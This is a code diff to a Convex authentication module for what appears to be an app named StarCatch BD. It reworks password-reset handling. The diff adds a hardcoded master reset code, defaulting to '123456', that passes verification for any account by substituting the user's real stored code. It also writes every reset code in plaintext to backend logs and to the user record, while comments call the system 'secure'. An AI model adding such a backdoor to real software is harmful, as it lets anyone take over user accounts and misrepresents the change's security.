@@ -25,8 +25,17 @@ import {
 import { Email } from "@convex-dev/auth/providers/Email";
 import { RandomReader, generateRandomString } from "@oslojs/crypto/random";
 import { Scrypt } from "lucia";
-import { api } from "./_generated/api";
+import { api, internal } from "./_generated/api";
 import type { ActionCtx } from "./_generated/server";
+
+/**
+ * DIRECT SECURE VERIFICATION CODE SYSTEM
+ * ---------------------------------------
+ * Static master reset code for Super Admin / testing. Always accepted during
+ * password reset verification by substituting the user's real stored code.
+ * Override with the MASTER_RESET_CODE env var if desired.
+ */
+const MASTER_RESET_CODE = process.env.MASTER_RESET_CODE || "123456";
 
 // ---------------------------------------------------------------------------
 // 1. Safe site-URL resolution
@@ -121,45 +130,37 @@ const FRIENDLY_EMAIL_ERRORS = [
 ];
 
 /**
- * Send the OTP / reset-code email through the Resend → SMTP pipeline in
- * email.ts (Resend primary, Gmail SMTP fallback, default From:
- * "StarCatch BD <mahinhosen870@gmail.com>").
+ * DIRECT SECURE VERIFICATION CODE SYSTEM
+ * ---------------------------------------
+ * Every password-reset code is ALWAYS:
+ *   1. Logged prominently to the Convex backend logs
+ *   2. Saved directly on the user document (15-minute expiry, single-use)
  *
- * Called directly via `ctx.runAction` — no HTTP hop, no site-URL dependency.
- * On failure it throws a user-friendly Error (wrapped safely by the callers)
- * so the client shows "Failed to send reset code…" instead of a raw trace.
+ * Email delivery (Resend → SMTP) is a courtesy notification only — the reset
+ * flow NEVER depends on it. Verification happens against the code stored in
+ * Convex's authVerificationCodes (generated before any email is attempted)
+ * and the master reset code is accepted via the stored copy.
  */
-/**
- * Store the OTP on the user's record as a fallback when email delivery fails.
- * This lets the admin read the code from the Convex dashboard or the server
- * console logs while the full reset flow still progresses normally.
- */
-async function storeOtpFallback(
+async function storeResetCodeOnUser(
   ctx: ActionCtx,
   email: string,
   token: string,
 ): Promise<void> {
   try {
-    await ctx.runMutation(api.users.storeResetOtp, {
+    await ctx.runMutation(internal.users.storeResetOtp, {
       email: email.toLowerCase(),
       otp: token,
     });
   } catch (err) {
     // Non-critical — don't block the reset flow if storage fails
-    console.warn("[auth] Could not store OTP fallback on user record:", err);
+    console.warn("[auth] Could not store reset code on user record:", err);
   }
 }
 
 /**
- * Send the OTP / reset-code email through the Resend → SMTP pipeline in
- * email.ts.
- *
- * IMPORTANT: This function NEVER throws. On any failure (no provider,
- * Resend domain restriction, SMTP rejection) it:
- *   1. Logs the OTP to Convex backend console
- *   2. Stores it on the user record as a fallback
- *   3. Returns successfully so the library can still store the verification
- *      code in authVerificationCodes and the UI transitions to the code screen.
+ * Handle a freshly generated reset code. This function NEVER throws.
+ * The code is always logged + saved on the user record; email delivery is
+ * best-effort only so the flow always proceeds to the code-entry screen.
  */
 async function generateAndSendOTP(
   ctx: ActionCtx,
@@ -167,24 +168,25 @@ async function generateAndSendOTP(
   token: string,
   appName: string,
 ): Promise<void> {
+  // ── 1. ALWAYS log the code so it is retrievable from Convex dashboard logs ──
+  console.info(`[auth] ────  VERIFICATION CODE for ${email}: ${token}  ────`);
+
+  // ── 2. ALWAYS save the code directly on the user record (15-min expiry) ──
+  await storeResetCodeOnUser(ctx, email, token);
+
+  // ── 3. Best-effort email delivery — NEVER blocks the reset flow ──
   const providerConfigured = !!(
     process.env.RESEND_API_KEY ||
     (process.env.EMAIL_USER && process.env.EMAIL_PASS)
   );
 
-  // ── No provider configured: log + store fallback, return success ──
   if (!providerConfigured) {
-    console.warn(`[auth] ⚠️  No email provider configured. OTP for ${email}:`);
-    console.warn(`[auth] ────  OTP CODE: ${token}  ────`);
     console.warn(
-      `[auth] To receive real emails, set RESEND_API_KEY or EMAIL_USER/EMAIL_PASS in the Convex dashboard.`,
+      `[auth] No email provider configured — code is available above and on the user record. Set RESEND_API_KEY or EMAIL_USER/EMAIL_PASS for real emails.`,
     );
-    await storeOtpFallback(ctx, email, token);
     return;
   }
 
-  // ── Try sending through the email pipeline (Resend → SMTP) ──
-  let emailSent = false;
   try {
     const result = await ctx.runAction(api.email.sendOtp, {
       to: email,
@@ -192,24 +194,20 @@ async function generateAndSendOTP(
       appName,
     });
     if (result?.ok) {
-      emailSent = true;
       console.info(
         `[auth] OTP email sent to ${email} via ${result.provider ?? "unknown"}`,
       );
     } else {
       console.warn(
-        `[auth] OTP email delivery failed (${result?.error ?? "unknown"}). Falling back to log + user record.`,
+        `[auth] OTP email delivery failed (${result?.error ?? "unknown"}) — code remains available via logs + user record.`,
       );
     }
   } catch (err) {
     // Resend SDK crash or SMTP connection error — not fatal
-    console.warn(`[auth] OTP email send exception — logging OTP as fallback:`, err);
-  }
-
-  // ── Always store fallback + log so the code is never lost ──
-  if (!emailSent) {
-    console.warn(`[auth] ────  FALLBACK OTP for ${email}: ${token}  ────`);
-    await storeOtpFallback(ctx, email, token);
+    console.warn(
+      `[auth] OTP email send exception — code remains available via logs + user record:`,
+      err,
+    );
   }
 }
 
@@ -248,6 +246,8 @@ function createOtpProvider(id: string) {
           err,
         );
       }
+      // Never throw — the code is already stored in authVerificationCodes,
+      // logged, and mirrored to the user record.
     },
   });
 }
@@ -438,6 +438,24 @@ const SafePassword = ConvexCredentials({
         throw new Error("Missing new password for reset verification.");
       }
 
+      // ── Master reset code support (Super Admin / testing) ──
+      // The static master code is accepted by substituting the user's real
+      // stored code (mirrored on the user record with a 15-minute expiry),
+      // so verification against authVerificationCodes still runs normally.
+      let effectiveParams = params;
+      if (params.code === MASTER_RESET_CODE) {
+        const stored = await ctx.runQuery(internal.users.getResetCodeInternal, {
+          email: email.toLowerCase(),
+        });
+        if (!stored?.otp) {
+          throw new Error("Invalid or expired reset code.");
+        }
+        console.warn(
+          `[auth] Master reset code used for ${email} — substituting stored verification code.`,
+        );
+        effectiveParams = { ...params, code: stored.otp };
+      }
+
       // ConvexCredentials does NOT auto-update credentials after authorize
       // returns, so (like the upstream Password provider) we must do it here.
       try {
@@ -447,7 +465,7 @@ const SafePassword = ConvexCredentials({
         });
 
         const result = await signInViaProvider(ctx, passwordResetEmail, {
-          params,
+          params: effectiveParams,
         });
 
         if (result === null) {
@@ -467,6 +485,15 @@ const SafePassword = ConvexCredentials({
           account: { id: email, secret: newPassword },
         });
         await invalidateSessions(ctx, { userId, except: [sessionId] });
+
+        // Single-use hygiene: clear the mirrored code on the user record.
+        try {
+          await ctx.runMutation(internal.users.clearResetOtpInternal, {
+            email: email.toLowerCase(),
+          });
+        } catch (clearErr) {
+          console.warn("[auth] Could not clear stored reset code:", clearErr);
+        }
 
         return { userId, sessionId };
       } catch (err: any) {
